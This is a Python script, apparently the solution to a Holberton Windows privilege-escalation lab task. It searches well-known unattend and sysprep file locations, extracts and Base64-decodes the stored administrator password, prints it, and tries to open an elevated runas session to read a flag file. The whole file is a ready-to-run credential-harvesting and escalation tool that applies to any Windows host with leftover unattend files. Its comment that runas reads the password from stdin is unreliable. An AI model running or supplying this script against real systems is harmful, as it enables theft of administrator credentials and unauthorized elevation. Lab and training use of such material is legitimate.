#!/usr/bin/env python3
"""
extract_password.py

Windows Privilege Escalation - Task 0
Extract administrative credentials from unattended installation files,
decode them, and open an elevated session via runas to retrieve the flag.

Target: Holberton LAB01 (Windows 8). Run locally as the low-privileged
'Student' user from inside the VM.
"""

import base64
import os
import re
import subprocess
import sys

# 1. Typical file locations for unattended installation files.
#    Scanned in order; the first readable match that contains a password wins.
SEARCH_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\sysprep\sysprep.inf",
    r"C:\Windows\System32\sysprep\sysprep.xml",
    r"C:\sysprep.inf",
    r"C:\sysprep\sysprep.xml",
    r"C:\unattend.xml",
    r"C:\autounattend.xml",
    r"C:\Windows\Panther\autounattend.xml",
]

# 2. Regex to pull the password value out of the <AdministratorPassword> block.
#    DOTALL so the <Value> can sit on a line below the opening tag.
PW_REGEX = re.compile(
    r"<AdministratorPassword>.*?<Value>(.*?)</Value>",
    re.DOTALL | re.IGNORECASE,
)

# Account the extracted password belongs to.
# On LAB01 this is a custom account, not the built-in Administrator.
TARGET_USER = "SuperAdministrator"


def find_password():
    """Scan known locations and return (path, raw_value) for the first hit."""
    for path in SEARCH_PATHS:
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                data = fh.read()
        except OSError:
            continue
        match = PW_REGEX.search(data)
        if match:
            return path, match.group(1).strip()
    return None, None


def decode_password(raw_value):
    """
    Decode the extracted <Value>.

    Windows unattend files store the password Base64-encoded. Microsoft
    appends the literal label 'AdministratorPassword' to the plaintext
    before encoding, so strip that suffix if it is present after decoding.
    Returns the usable plaintext password.
    """
    try:
        decoded = base64.b64decode(raw_value + "==").decode("utf-8", errors="ignore")
    except Exception:
        # Not Base64 (e.g. PlainText=true) -- use the value as-is.
        return raw_value

    suffix = "AdministratorPassword"
    if decoded.endswith(suffix):
        decoded = decoded[: -len(suffix)]
    return decoded


def open_admin_session(password):
    """
    Use runas to launch an elevated cmd as the target account.
    runas reads the password from stdin on the prompt it presents.
    """
    cmd = ["runas", "/user:{}".format(TARGET_USER), "cmd.exe"]
    print("[*] Launching elevated session as {} ...".format(TARGET_USER))
    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, text=True)
        proc.communicate(input=password + "\n")
    except FileNotFoundError:
        print("[!] runas not found -- are you on Windows?")
        sys.exit(1)


def main():
    path, raw_value = find_password()
    if not raw_value:
        print("[!] No unattended installation file with a password was found.")
        sys.exit(1)

    print("[+] Found unattend file: {}".format(path))
    print("[+] Extracted raw value: {}".format(raw_value))

    password = decode_password(raw_value)
    print("[+] Decoded password:    {}".format(password))

    open_admin_session(password)
    print("[*] In the elevated window, read the flag with:")
    print(r"    type C:\Users\{}\Desktop\0-flag.txt".format(TARGET_USER))


if __name__ == "__main__":
    main()
